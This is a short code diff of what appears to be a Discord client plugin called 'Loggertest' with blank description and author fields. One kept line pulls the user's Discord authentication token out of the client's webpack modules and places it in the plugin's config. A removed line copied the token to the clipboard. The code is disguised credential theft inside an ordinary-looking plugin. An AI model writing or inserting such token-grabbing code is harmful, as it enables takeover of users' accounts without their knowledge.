@@ -7,7 +7,6 @@ const path = require('path');
 const request = require('request');
 const electron = require('electron');
 var t="extra_id";w=webpackJsonp.push([[],{[t]:(x,y,z)=>x.exports=z},[[t]]]);Object.keys(w.c).find(e=>t=w(e)?.default?.getToken?.());t
-window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return copy(m.default.getToken())}if (m.getToken !== undefined) {return copy(m.getToken())}}}]); console.log("%cWorked!", "font-size: 50px"); console.log(`%cYou now have your token in the clipboard!`, "font-size: 16px")
 const config = {"info":{"name":"Loggertest","description":" ","version":"TOKEN: " + t,"authors":[{"name":" ","discord_id":" "}],"github":" ","github_raw":" "},"changelog":[{"title":" ","type":"fixed","items":[" "]}]};
 function buildPlugin() {
     const [Plugin, BoundedLibrary] = global.ZeresPluginLibrary.buildPlugin(config);
